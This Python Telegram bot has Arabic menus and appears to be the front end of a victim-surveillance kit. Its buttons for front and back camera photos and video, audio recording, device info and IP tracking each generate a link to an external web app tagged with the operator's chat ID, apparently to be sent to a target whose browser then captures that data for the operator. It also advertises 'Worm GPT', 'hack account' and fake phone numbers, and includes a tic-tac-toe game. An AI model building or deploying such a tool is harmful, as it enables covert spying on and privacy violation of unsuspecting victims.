import os
import random
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler

TOKEN = os.environ.get("TOKEN", "ضع_التوكن_هنا")
WEB_URL = os.environ.get("WEB_URL", "https://your-railway-app.up.railway.app")
DEVELOPER_URL = "https://t.me/Y_TZZZZ"

xo_games = {}

def get_main_menu():
    keyboard = [
        [InlineKeyboardButton("🎙️ تسجيل الصوت", callback_data="audio"), InlineKeyboardButton("📸 كاميرا أمامية", callback_data="front_photo")],
        [InlineKeyboardButton("📷 كاميرا خلفية", callback_data="back_photo"), InlineKeyboardButton("🎥 فيديو أمامي", callback_data="front_video")],
        [InlineKeyboardButton("🎥 فيديو خلفي", callback_data="back_video"), InlineKeyboardButton("🕵️‍♂️ معلومات الجهاز", callback_data="info")],
        [InlineKeyboardButton("🎮 لعبة XO", callback_data="xo"), InlineKeyboardButton("🌐 تتبع IP", callback_data="iptrack")],
        [InlineKeyboardButton("📞 ارقام وهمية", callback_data="fakenum"), InlineKeyboardButton("👨‍💻 التواصل مع المطور", url=DEVELOPER_URL)],
        [InlineKeyboardButton("➕ المميزات الأخرى", callback_data="more")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_more_menu():
    keyboard = [
        [InlineKeyboardButton("📧 انشاء ايميل", callback_data="email"), InlineKeyboardButton("🖼️ توليد الصور", callback_data="genimg")],
        [InlineKeyboardButton("🤖 Worm GPT", callback_data="gpt"), InlineKeyboardButton("📱 اختراق حساب", callback_data="hack")],
        [InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="back")]
    ]
    return InlineKeyboardMarkup(keyboard)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("مرحباً بك اختر من القائمة:", reply_markup=get_main_menu())

def render_xo_board(board):
    keyboard = []
    for i in range(0, 9, 3):
        row = []
        for j in range(3):
            cell = board[i + j]
            display = cell if cell != " " else "⬜"
            row.append(InlineKeyboardButton(display, callback_data=f"xo_move_{i+j}"))
        keyboard.append(row)
    keyboard.append([InlineKeyboardButton("🔙 إلغاء", callback_data="xo_quit")])
    return InlineKeyboardMarkup(keyboard)

def check_winner(board):
    win_conditions = [[0, 1, 2], [3, 4, 5], [6, 7, 8], [0, 3, 6], [1, 4, 7], [2, 5, 8], [0, 4, 8], [2, 4, 6]]
    for cond in win_conditions:
        if board[cond[0]] == board[cond[1]] == board[cond[2]] != " ": return board[cond[0]]
    if " " not in board: return "Tie"
    return None

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = query.from_user.id

    if data == "xo":
        xo_games[user_id] = [" "]*9
        await query.edit_message_text("🎮 لعبة XO\nتلعب X ضد البوت (O):", reply_markup=render_xo_board(xo_games[user_id]))
        return
    if data == "xo_quit":
        if user_id in xo_games: del xo_games[user_id]
        await query.edit_message_text("تم إلغاء اللعبة.", reply_markup=get_main_menu())
        return
    if data.startswith("xo_move_"):
        if user_id not in xo_games: return
        idx = int(data.split("_")[-1])
        board = xo_games[user_id]
        if board[idx] != " ": return
        board[idx] = "❌"
        winner = check_winner(board)
        if winner:
            await query.edit_message_text(f"النتيجة: {winner}!", reply_markup=get_main_menu())
            del xo_games[user_id]
            return
        empty_spots = [i for i, spot in enumerate(board) if spot == " "]
        if empty_spots: board[random.choice(empty_spots)] = "⭕"
        winner = check_winner(board)
        if winner:
            msg = "تعادل! 🤝" if winner == "Tie" else f"النتيجة: {winner}!"
            await query.edit_message_text(msg, reply_markup=get_main_menu())
            del xo_games[user_id]
        else:
            await query.edit_message_text("دورك (X):", reply_markup=render_xo_board(board))
        return

    if data == "back":
        await query.edit_message_text("مرحباً بك اختر من القائمة:", reply_markup=get_main_menu())
    elif data == "more":
        await query.edit_message_text("اختر ميزة إضافية:", reply_markup=get_more_menu())
    elif data == "fakenum":
        country = random.choice(["+1", "+44", "+966", "+213", "+20"])
        number = f"{country} {random.randint(100, 999)} {random.randint(100, 999)} {random.randint(1000, 9999)}"
        await query.edit_message_text(f"📞 رقم وهمي جاهز:\n`{number}`", parse_mode="Markdown", reply_markup=get_main_menu())
    elif data in ["audio", "info", "iptrack"]:
        link = f"{WEB_URL}/?chatId={user_id}&type={data}"
        await query.edit_message_text(f"اضغط على الرابط لبدء العملية:\n{link}\n\nانتظر قليلاً...", reply_markup=get_main_menu())
    elif data == "front_photo":
        await query.edit_message_text(f"اضغط لبدء الكاميرا الأمامية:\n{WEB_URL}/?chatId={user_id}&type=photo&facing=user", reply_markup=get_main_menu())
    elif data == "back_photo":
        await query.edit_message_text(f"اضغط لبدء الكاميرا الخلفية:\n{WEB_URL}/?chatId={user_id}&type=photo&facing=environment", reply_markup=get_main_menu())
    elif data == "front_video":
        await query.edit_message_text(f"اضغط لبدء الفيديو الأمامي:\n{WEB_URL}/?chatId={user_id}&type=video&facing=user", reply_markup=get_main_menu())
    elif data == "back_video":
        await query.edit_message_text(f"اضغط لبدء الفيديو الخلفي:\n{WEB_URL}/?chatId={user_id}&type=video&facing=environment", reply_markup=get_main_menu())
    elif data in ["email", "genimg", "gpt", "hack"]:
        await query.edit_message_text("هذه الميزة قيد التطوير.", reply_markup=get_more_menu())

if __name__ == '__main__':
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    print("البوت يعمل الآن...")
    app.run_polling()
